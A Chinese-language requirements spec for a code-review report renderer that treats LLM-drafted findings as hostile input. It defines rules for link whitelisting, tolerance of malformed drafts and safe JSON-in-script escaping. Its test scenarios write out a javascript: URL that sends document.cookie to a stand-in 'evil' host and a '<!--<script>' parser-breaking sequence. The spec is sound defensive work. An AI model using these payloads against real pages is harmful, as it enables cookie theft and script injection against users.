## ADDED Requirements

### Requirement: 报告渲染的输入敌意防御与降级路径数据保真

报告渲染器(`render_sdr_report.py`)SHALL 把 LLM 草稿字段(findings 的 file/chain/line/
severity 等,引述受审仓库与外部前端仓源码)视为**敌意输入**:

- **链接化白名单语义**:findings「位置」的链接化 SHALL 仅对仓内相对路径启用——相对路径
  首段含冒号(`:`)的取值(scheme 形如 `javascript:`、盘符相对形如 `C:foo`)SHALL 放弃
  链接化、降级纯文本展示;判定 SHALL 同时作用于入口原始值与路径归一后的最终值(normpath
  的斜杠折叠 SHALL NOT 复活 scheme 载荷)。绝对路径分支的既有白名单语义不变。
- **草稿错型容错**:任何标量字段的类型错乱(如 severity 为数组/对象)SHALL 落确定性默认值
  或既有降级路径,渲染与 `--check` 双路径 SHALL NOT 因草稿内容抛出未捕获异常、SHALL NOT
  产生契约外退出码。
- **嵌入转义闭集**:JSON 数据块内嵌 HTML `<script>` 的转义 SHALL 覆盖 HTML 解析器的
  script-data-double-escaped 状态——数据中出现 `<!--` 后随 `<script` 的序列 SHALL NOT
  使页面自身渲染 JS 被解析器当作数据文本吞掉;转义 SHALL 与解析等价(数据块经 JS 反序列化
  后与 canonical 数据文件语义逐值等价),`--check` 的同源比对 SHALL 继续成立。
- **降级路径数据保真**:存在 failed 评审单元时,报告简表与其数据载体的行-单元对应关系
  SHALL 保持对齐——failed 单元 SHALL 与其行同进退(其行不残留未填占位、后续单元 SHALL NOT
  错位继承他人取值);前端使用两列与路由命中计数的 join SHALL 按精确路由串匹配(嵌套前缀
  路由 SHALL NOT 互相串计),报告、manifest、canonical 数据三载体 SHALL 一致,`--check`
  SHALL 能检出不一致。

#### Scenario: scheme 载荷降级纯文本

- **WHEN** 某条 finding 的 file 字段为 `javascript:location=`https:/evil/${document.cookie}`
  (无空格、无圆括号)或 `C:Windows/evil.java`
- **THEN** 渲染产物中该条目为纯文本,任何 `<a href>` SHALL NOT 携带该取值;canonical
  数据文件中该字段原样保留(数据不失真,只不做链接)

#### Scenario: 错型 severity 不崩渲染与校验

- **WHEN** 某草稿含 `"severity": ["high"]` 或 `"severity": {}`
- **THEN** 渲染与 `--check` 均正常完成、退出码符合契约;该条 severity 落默认级;stderr/
  披露不静默吞掉异常形态(可提示修复草稿)

#### Scenario: 敌意引述不吞页面 JS

- **WHEN** 某条 finding 的风险描述或引述含 `<!--<script>` 序列(外部前端仓片段的现实形态)
- **THEN** 渲染后报告页面自身全部渲染 JS 正常执行、六章节完整呈现;嵌入数据反序列化后与
  canonical 数据语义逐值等价;`--check` 对该产物 exit 0

#### Scenario: failed 单元存在时简表不错位

- **WHEN** 一次 run 的单元中恰有一个 failed、其余 ok 且部分命中前端路由
- **THEN** 简表每行的前端两列与该行单元自身对应:命中单元显示其命中,未命中单元显示无,
  failed 行不显示他人取值;manifest/data/HTML 三载体一致;`--check` exit 0

#### Scenario: 嵌套路由计数不串位

- **WHEN** 两个接口路由为前缀嵌套关系(如 `/api/user` 与 `/api/user/list`),前端命中计量
  仅覆盖其中之一
- **THEN** 仅被计量的路由在前端两列显示命中,另一路由不因子串包含而显示命中;「无前端使用」
  SHALL NOT 被标为「有」
